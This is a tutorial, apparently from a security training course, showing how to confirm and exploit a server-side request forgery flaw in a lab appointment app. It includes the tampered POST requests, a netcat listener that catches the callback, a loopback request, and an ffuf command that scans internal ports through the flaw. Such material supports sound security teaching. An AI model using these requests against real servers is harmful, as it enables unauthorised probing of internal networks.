# Identifying SSRF

After discussing the basics of SSRF vulnerabilities, let us jump right into an example web application.

## Confirming SSRF

Looking at the web application, we are greeted with some generic text as well as functionality to schedule appointments:

**Request URL:**
```
http://<SERVER_IP>:<PORT>/
```

The application displays text about DefendTech Innovations' commitment to client relationships and security, with a 'Schedule an appointment' section featuring a date picker and 'Check Availability' button.

After checking the availability of a date, we can observe the following request in Burp:

```
POST /index.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded

date=<date>&dateserver=http://<dateserver_url>/
```

The request contains our chosen date and a URL in the `dateserver` parameter, indicating that the web server retrieves availability information from a separate system.

### Testing for SSRF

To confirm an SSRF vulnerability, supply a URL pointing to our system:

```
POST /index.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded

date=<date>&dateserver=http://172.17.0.1:8000/ssrf
```

Using a netcat listener, we can receive a connection:

```bash
$ nc -lnvp 8000
listening on [any] 8000 ...
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 38782
GET /ssrf HTTP/1.1
Host: 172.17.0.1:8000
Accept: */*
```

### Exploiting Non-Blind SSRF

Point the web application to itself using `http://127.0.0.1/index.php`:

```
POST /index.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded

date=<date>&dateserver=http://127.0.0.1/index.php
```

The response contains the web application's HTML code, confirming a **non-blind SSRF** vulnerability.

## Enumerating the System

We can utilize SSRF to conduct port scanning. When supplying a closed port (e.g., 81), the response contains an error message.

### Port Scanning with ffuf

Create a wordlist of ports to scan:

```bash
$ seq 1 10000 > ports.txt
```

Fuzz all ports while filtering error responses:

```bash
$ ffuf -w ./ports.txt -u http://172.17.0.2/index.php -X POST \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "dateserver=http://127.0.0.1:FUZZ/&date=2024-01-01" \
    -fr "Failed to connect to"
```

**Results:**

```
[Status: 200, Size: 45, Words: 7, Lines: 1]    FUZZ: 3306
[Status: 200, Size: 8285, Words: 2151, Lines: 158]    FUZZ: 80
```

Port 3306 is typically used for SQL databases. Additional internal services could also be identified and accessed through SSRF.
